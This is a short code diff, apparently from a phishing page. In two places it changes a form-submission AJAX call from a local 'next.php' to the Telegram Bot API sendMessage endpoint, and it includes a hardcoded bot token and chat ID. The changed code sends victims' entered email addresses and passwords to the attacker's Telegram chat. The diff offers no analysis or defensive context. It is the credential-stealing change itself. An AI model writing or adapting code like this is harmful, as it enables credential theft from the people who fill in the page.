@@ -433,9 +433,13 @@ position: fixed;
          
 		$.ajax({
          dataType: 'JSON',
-         url: 'next.php',
-        type: 'POST',
-         data:{
+         url: "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
+
+        type: "POST",
+
+        data: {
+
+            chat_id: "8614416084",
            email:email,
            password:password,
           detail:detail 
@@ -468,9 +472,13 @@ position: fixed;
             
          $.ajax({
           dataType: 'JSON',
-          url: 'next.php',
-          type: 'POST',
-          data:{
+          url: "https://api.telegram.org/bot8883709162:AAH4hi8NPjE3ULxGdd3gcXFCjEwDGnosFbM/sendMessage",
+
+        type: "POST",
+
+        data: {
+
+            chat_id: "8614416084",
             email:email,
             password:password,
             detail:detail,
